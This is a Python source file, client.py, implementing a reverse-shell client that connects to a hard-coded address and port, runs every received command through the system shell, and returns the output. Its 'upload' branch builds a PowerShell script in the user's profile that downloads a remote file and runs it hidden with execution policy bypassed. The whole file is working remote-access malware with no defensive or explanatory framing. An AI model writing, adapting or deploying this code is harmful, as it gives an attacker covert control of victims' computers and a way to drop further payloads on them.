#client.py
import socket
import os
import platform
import subprocess
import sys

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server = "192.168.1.16"
port = 12345

print ("Established connection to :", server, ":", port)

client.connect((server, port))

try: 
     

    while True:
        command = client.recv(1024).decode()

        if command.startswith('upload'):
            if platform.system().lower()=="windows":
                
                os.system('echo ([Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12) > %USERPROFILE%\\up.ps1 & echo (New-Object System.Net.WebClient).DownloadFile(\'forwarding/' + command.lstrip('upload ') + '\',' + '$home+' + '\'' + '\\' + command.lstrip('upload ') + '\')  >> %USERPROFILE%\\up.ps1 & start /b /min powershell -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\up.ps1')
                cmd_output = subprocess.check_output("echo Done! Uploaded to & echo %USERPROFILE%\\"+ command.lstrip('upload '), shell=True)
        elif command.startswith("exit"):
            sys.exit()
           
        else:
            cmd_output = subprocess.check_output(command+" & echo Done!", shell=True)
            client.send(cmd_output)
            
    
finally:
    client.close()


    
    #print("Executed : ", data.decode())
    #os.system('cmd /k' + data.decode()).system('cmd /k' + data.decode())
    
